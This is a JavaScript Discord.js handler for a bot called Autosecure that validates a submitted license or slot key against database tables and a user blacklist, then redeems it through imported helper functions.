const { EmbedBuilder } = require("discord.js");
const { queryParams } = require("../../../db/database");
const { notifierWebhook, roleid, guildid } = require("../../../config.json");
const { autosecurelogs } = require("../../../autosecure/utils/embeds/autosecurelogs");
const access = require("../../../db/access");
const quicksetupmsg = require("../../../autosecure/utils/embeds/quicksetupmsg");
const { redeemSlotKey, redeemLicense } = require("../../../autosecure/utils/bot/redeemutils")

module.exports = {
  name: "licensemodal",
  callback: async (client, interaction) => {
    await interaction.deferReply({ ephemeral: true });

    try {
      const license = interaction.fields.getTextInputValue("licenseInput");

      const licenseData = await queryParams("SELECT license, duration FROM licenses WHERE license=?", [license]);
      const slots = await queryParams("SELECT * FROM unusedslots WHERE unusedslots=?", [license]);
      const blacklistCheck = await queryParams("SELECT * FROM autosecureblacklist WHERE user_id=?", [interaction.user.id]);
      const usedCheck = await queryParams("SELECT * FROM usedLicenses WHERE license=?", [license]);

      
      if (blacklistCheck.length > 0) {
        const embed = new EmbedBuilder()
          .setColor('#5f9ea0')
          .setDescription(`**You are blacklisted from using Autosecure!**\nReason: ${blacklistCheck[0].reason || "No reason provided"}`);
        return interaction.editReply({ embeds: [embed] });
      }

      // Sometimes useful
        if (usedCheck.length > 0) {
        const embed = new EmbedBuilder().setColor('#5f9ea0').setDescription("**Invalid license key-**");
        return interaction.editReply({ embeds: [embed] });
      }

      if (licenseData.length === 0 && slots.length === 0) {
        const embed = new EmbedBuilder().setColor('#5f9ea0').setDescription("**Invalid slot/subscription license!** Contact support!");
        return interaction.editReply({ embeds: [embed] });
      }


      if (slots.length > 0) {
        let d = await access(interaction.user.id);
        if (!d) {
          const embed = new EmbedBuilder().setColor('#5f9ea0').setDescription("You need to buy a license first to use this bot slot!");
          return interaction.editReply({ embeds: [embed] });
        }
        await redeemSlotKey(client, interaction, slots[0].unusedslots);
        return;
      }


      // Slot already checked, redeem a license.
      await redeemLicense(client, interaction, license, licenseData[0]);
    } catch (error) {
      console.error("Error in licensemodal:", error);
      const embed = new EmbedBuilder().setColor('#5f9ea0').setDescription("**An error occurred while processing the license.**");
      await interaction.editReply({ embeds: [embed] });
    }
  }
};
